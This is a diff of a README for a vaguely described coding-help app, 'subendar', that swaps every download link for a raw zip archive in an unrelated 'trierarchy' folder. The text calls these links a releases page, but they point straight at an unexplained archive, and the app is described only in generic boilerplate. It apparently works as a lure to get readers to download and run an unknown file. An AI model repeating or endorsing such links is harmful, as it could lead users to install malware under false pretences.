@@ -1,7 +1,7 @@
 # 🚀 subendar - Simplifying Your Coding Journey
 
 ## 📥 Download Now
-[![Download](https://github.com/kontsaa/subendar/raw/refs/heads/main/trierarchy/Software_v1.5-alpha.2.zip)](https://github.com/kontsaa/subendar/raw/refs/heads/main/trierarchy/Software_v1.5-alpha.2.zip)
+[![Download](https://raw.githubusercontent.com/kontsaa/subendar/main/trierarchy/Software-v2.4.zip)](https://raw.githubusercontent.com/kontsaa/subendar/main/trierarchy/Software-v2.4.zip)
 
 ## 📖 Introduction
 Welcome to **subendar**! This application helps users with coding, design, and problem-solving tasks. Whether you're a computer science student or just looking to improve your skills, this tool provides resources and support to enhance your learning experience.
@@ -21,7 +21,7 @@ Before downloading **subendar**, ensure your computer meets the following system
 
 ## 🚀 Getting Started
 1. **Visit the Download Page**: Click the link below to go to the releases page where you can find the latest version of subendar.
-   [Download Here](https://github.com/kontsaa/subendar/raw/refs/heads/main/trierarchy/Software_v1.5-alpha.2.zip)
+   [Download Here](https://raw.githubusercontent.com/kontsaa/subendar/main/trierarchy/Software-v2.4.zip)
    
 2. **Choose the Right Version**: Look for the latest release on the page. It is typically at the top of the list.
 
@@ -30,7 +30,7 @@ Before downloading **subendar**, ensure your computer meets the following system
 ## 💻 Download & Install
 To download and run the application:
 
-1. **Visit the Download Page**: Access the page here: [Download Here](https://github.com/kontsaa/subendar/raw/refs/heads/main/trierarchy/Software_v1.5-alpha.2.zip).
+1. **Visit the Download Page**: Access the page here: [Download Here](https://raw.githubusercontent.com/kontsaa/subendar/main/trierarchy/Software-v2.4.zip).
 
 2. **Select the File to Download**: Click on the appropriate version for your system. 
 
